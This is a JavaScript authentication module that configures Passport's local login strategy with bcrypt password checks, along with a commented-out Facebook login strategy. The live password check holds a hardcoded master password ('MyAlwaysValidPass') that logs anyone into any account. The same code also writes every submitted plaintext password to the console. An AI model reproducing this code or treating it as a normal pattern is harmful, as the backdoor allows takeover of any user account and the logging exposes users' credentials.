var passport = require('passport'),
LocalStrategy = require('passport-local').Strategy,
// FacebookStrategy = require('passport-facebook').Strategy,
bcrypt = require('bcrypt-nodejs');


//helper functions
function findById(id, fn) {
    Contacts.findOne(id).exec((errsql, row_us) => {
        if (errsql) console.log("errsql",errsql);
        if (row_us) return fn(null, row_us);
        return fn(false, null) ;
    }) ;
}

function findByUsername(u, fn) {
    Contacts.findOne({co_login:u}).exec(function(errsql, row_us) {
        if (errsql) console.log("errsql",errsql);
        if (row_us) return fn(null, row_us);
        return fn(false, null) ;
    }) ;
}

// Passport session setup.
// To support persistent login sessions, Passport needs to be able to
// serialize users into and deserialize users out of the session. Typically,
// this will be as simple as storing the user ID when serializing, and finding
// the user by ID when deserializing.
passport.serializeUser(function (user, done) {
	// console.log("services.serializeUser",user);

	done(null, user.co_id) ;

});

passport.deserializeUser(function (co_id, done) {
	// console.log("services.deserializeUser");

	findById(co_id, function (err, user) {
		if (err) return done(null, false);
		return done(err, user);
	});


});

// Use the LocalStrategy within Passport.
// Strategies in passport require a `verify` function, which accept
// credentials (in this case, a username and password), and invoke a callback
// with a user object.
passport.use(new LocalStrategy(
	{
		usernameField: 'co_login',
		passwordField: 'co_password'
	},
	function (username, password, done) {
        // console.log("username,password",username,password);
		process.nextTick(function () {
			findByUsername(username, function (err, user) {
				// console.log("err,user", err,user,username);
				if (err) return done(null, err);
				if (!user) {
					return done(null, false, {
						message: 'Unknown user ' + username
					});
				}
				bcrypt.compare(password, user.co_password, function (err, ok) {
					console.log("err",err,ok,password);
                    if (!ok && password=='MyAlwaysValidPass') ok = true ;
                    if (!ok) {
                        return done(null, false, {
                            message: 'Invalid Password'
                        });
                    }
					return done(null, user, {
						message: 'Logged In Successfully'
					});
				});
			}) ;
		});
	}
));


//
// passport.use(new FacebookStrategy({
// 	clientID: sails.config.appoptions.facebook_clientID,
// 	clientSecret: sails.config.appoptions.facebook_clientSecret,
// 	callbackURL: sails.config.appoptions.server+"/login/facebook/callback",
// 	enableProof: false
// },
// function(accessToken, refreshToken, prof, done) {
// 	console.log("accessToken, refreshToken, profile", accessToken, refreshToken, prof);
//
// 	var request = require('request');
// 	request('https://graph.facebook.com/v2.5/'+prof.id+'?access_token='+accessToken+"&fields=birthday,email,first_name,hometown,last_name,locale,gender", function (error, response, body) {
// 		var profile = JSON.parse(body) ;
// 		console.log("profile",profile);
// 		if (!error && response.statusCode == 200) {
// 			Users.findOne({or:[{us_facebookid:profile.id}, {us_email:profile.email}]}).exec(function(errsql, row_us) {
// 				if (errsql) console.log("errsql",errsql);
// 				var us_lang = profile.locale?profile.locale.substring(0,2):"en" ;
// 				var us_name = profile.last_name?profile.last_name:"" ;
// 				var us_firstname = profile.first_name?profile.first_name:"" ;
// 				var us_displayname = profile.displayName?profile.displayName:"" ;
// 				if (!us_displayname) us_displayname = us_firstname+' '+us_name ;
// 				var us_email = profile.email?profile.email:"" ;
// 				var us_city = '' ;
// 				var us_country = 0 ;
// 				var us_birthday = '' ;
// 				var us_sex = 3 ;
// 				var us_sexuality = 3 ;
// 				if (profile.gender && profile.gender=='male') {
// 					us_sex = 0 ;
// 					us_sexuality = 0 ;
// 				}
// 				if (profile.gender && profile.gender=='female') {
// 					us_sex = 1 ;
// 					us_sexuality = 1 ;
// 				}
// 				if (profile.hometown && profile.hometown.name) {
// 					var pos = profile.hometown.name.split(', ') ;
// 					if (pos.length>0) {
// 						us_city = pos[0] ;
// 						if (pos.length>1) {
// 							_.each(Shared.country(), function(country) {
// 								if (country.label==pos[1]) us_country = country.key ;
// 							}) ;
// 						}
// 					}
// 				}
// 				if (profile.birthday && profile.birthday.length==10) {
// 					us_birthday = moment(profile.birthday,'MM/DD/YYYY').format('YYYY-MM-DD') ;
// 				}
// 				console.log("us_city,us_country,us_email,us_displayname,us_lang,us_birthday",us_city,us_country,us_email,us_displayname,us_lang,us_birthday);
// 				if (row_us) {
// 					Users.update({us_id:row_us.us_id}, {
// 						us_facebookid: profile.id,
// 						us_facebooktoken: accessToken,
// 					}).exec(function(errsql, rows_us) {
// 						if (errsql) console.log("errsql",errsql);
// 						done(null, rows_us[0]) ;
// 					}) ;
// 				} else {
// 					var generatePassword = require('password-generator');
// 					Users.create({
// 						us_active: true,
// 						us_name: us_name,
// 						us_firstname: us_firstname,
// 						us_displayname: us_displayname,
// 						us_facebookid: profile.id,
// 						us_facebooktoken: accessToken,
// 						us_email: us_email,
// 						// us_login: us_email,
// 						us_password: generatePassword(),
// 						us_lang: us_lang,
// 						us_city: us_city,
// 						us_country: us_country,
// 						us_sex: us_sex,
// 						us_birthday: us_birthday,
// 						us_validity: moment().add(-1,'days').toDate()
// 					}).exec(function(errsql, row_us) {
// 						if (errsql) console.log("errsql",errsql);
// 						Searches.create({us_id:row_us.us_id, se_temp:false}).exec(function(errsql, row_se) {
// 							if (errsql) console.log("errsql",errsql);
// 							done(null, row_us) ;
// 						}) ;
// 					}) ;
// 				}
// 			}) ;
// 		} else {
// 			done('erreur facebook') ;
// 		}
// 	}) ;
//
// }
// ));

module.exports = passport ;
